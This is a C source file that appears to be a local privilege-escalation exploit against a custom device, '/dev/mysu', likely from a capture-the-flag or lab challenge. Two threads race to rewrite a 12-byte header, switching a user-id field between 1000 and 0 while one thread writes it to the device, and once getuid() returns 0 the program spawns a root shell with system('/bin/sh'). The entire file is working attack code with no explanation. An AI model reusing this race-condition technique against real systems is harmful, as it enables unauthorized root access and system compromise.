#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <pthread.h>

char header[12] = {0xff, 0xff, 0x00, 0x00, 0x6e, 0x63, 0x7b, 0x89, 0x00, 0x00, 0x00, 0x40};
bool root = false;

void *uid_1000() {
    while(!root) {
        if (getuid() != 0) {
            header[0] = 0xe8;
            header[1] = 0x03;

            int fd = open("/dev/mysu", O_RDWR);

            write(fd, header, sizeof(header));
            close(fd);
        } else {
            root = true;

            system("/bin/sh");
            exit(0);
        }
    }
}

void *uid_0()
{
    while(!root) {
        if(getuid() != 0) {
            header[0] = 0x00;
            header[1] = 0x00;
        } else {
            root = true;

            system("/bin/sh");
            exit(0);
        }
    }
}

int main() {
    pthread_t thread_1;
    pthread_t thread_2;

    pthread_create(&thread_1, NULL, uid_1000, NULL);
    pthread_create(&thread_2, NULL, uid_0, NULL);

    pthread_join(thread_1, NULL);
    pthread_join(thread_2, NULL);

    return 0;
}
